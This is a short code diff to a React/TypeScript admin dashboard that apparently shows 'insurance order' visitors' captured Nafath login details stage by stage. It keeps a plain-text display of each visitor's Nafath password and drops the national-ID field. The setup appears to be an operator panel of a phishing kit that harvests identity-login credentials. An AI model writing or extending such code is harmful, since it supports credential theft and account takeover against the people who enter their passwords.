@@ -480,17 +480,8 @@ function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], sel
   const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_login").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
   const rejected = events.filter(e => e.status === "rejected");
   const latestEvent = events.at(-1);
-  const payloadNatId = (latestEvent?.payload as any)?.national_id;
   const payloadPassword = (latestEvent?.payload as any)?.nafath_password;
-
-  const stageState = getStageState(order, "nafath_login");
-
-  // Only show nafath-specific data if this stage was reached
-  const nationalId = order.nafath_password ? (order.national_id || payloadNatId || selectedVisitor?.national_id || visitorNationalId) : (payloadNatId || null);
   const password = order.nafath_password || payloadPassword || null;
-
-  // If stage hasn't been reached yet and no events, show visitor's national_id as preview
-  const previewNationalId = stageState === "idle" ? (selectedVisitor?.national_id || order.national_id || visitorNationalId) : (nationalId || selectedVisitor?.national_id || order.national_id || visitorNationalId);
 
   return (
     <div className="space-y-1.5">
@@ -503,11 +494,8 @@ function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], sel
           </div>
         </div>
       ))}
-      {(previewNationalId || password) ? (
-        <div className="grid grid-cols-1 gap-1.5">
-          <InfoItem label="اسم المستخدم (الهوية)" value={previewNationalId || "—"} />
-          <InfoItem label="كلمة المرور" value={password || (stageState === "idle" ? "لم يصل لهذه المرحلة بعد" : "—")} />
-        </div>
+      {password ? (
+        <InfoItem label="كلمة المرور" value={password} />
       ) : (
         <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
       )}
